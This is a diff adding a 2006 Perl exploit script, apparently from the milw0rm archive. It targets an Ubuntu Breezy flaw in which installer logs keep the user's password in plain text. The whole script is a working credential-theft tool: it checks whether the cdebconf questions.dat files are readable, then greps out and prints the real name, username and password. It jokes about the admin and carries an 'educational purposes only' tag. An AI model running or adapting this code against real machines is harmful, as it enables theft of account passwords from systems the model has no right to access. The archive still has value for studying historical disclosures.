@@ -1,0 +1,62 @@
+#!/usr/bin/perl -w
+
+use warnings;
+use strict;
+
+##############################################################################
+# Author: Kristian Hermansen
+# Date: 3/12/2006
+# Overview: Ubuntu Breezy stores the installation password in plain text
+# Link: https://launchpad.net/distros/ubuntu/+source/shadow/+bug/34606
+##############################################################################
+
+print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
+print "Kristian Hermansen's 'Eazy Breezy' Password Recovery Tool\n";
+print "99% effective, thank your local admin ;-)\n";
+print "FOR EDUCATIONAL PURPOSES ONLY!!!\n";
+print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n";
+
+# the two vulnerable files
+my $file1 = "/var/log/installer/cdebconf/questions.dat";
+my $file2 = "/var/log/debian-installer/cdebconf/questions.dat";
+
+print "Checking if an exploitable file exists...";
+if ( (-e $file1) || (-e $file2) )
+{ 
+  print "Yes\nNow checking if readable...";
+  if ( -r $file1 )
+  {
+    getinfo($file1);
+  }
+  else
+  {
+    if ( -r $file2 ) {
+      getinfo($file2);
+    }
+    else {
+      print "No\nAdmin may have changed the permissions on the files :-(\nExiting...\n";
+      exit(-2);
+    }
+  }
+}
+else
+{
+  print "No\nFile may have been deleted by the administrator :-(\nExiting...\n";
+  exit(-1);
+}
+
+sub getinfo {
+  my $fn = shift;
+  print "Yes\nHere come the details...\n\n";
+  my $realname = `grep -A 1 "Template: passwd/user-fullname" $fn | grep "Value: " | sed 's/Value: //'`;
+  my $user = `grep -A 1 "Template: passwd/username" $fn | grep "Value: " | sed 's/Value: //'`;
+  my $pass = `grep -A 1 "Template: passwd/user-password-again" $fn | grep "Value: " | sed 's/Value: //'`;
+  chomp($realname);
+  chomp($user);
+  chomp($pass);
+  print "Real Name: $realname\n";
+  print "Username: $user\n";
+  print "Password: $pass\n";
+}
+
+# milw0rm.com [2006-03-12]
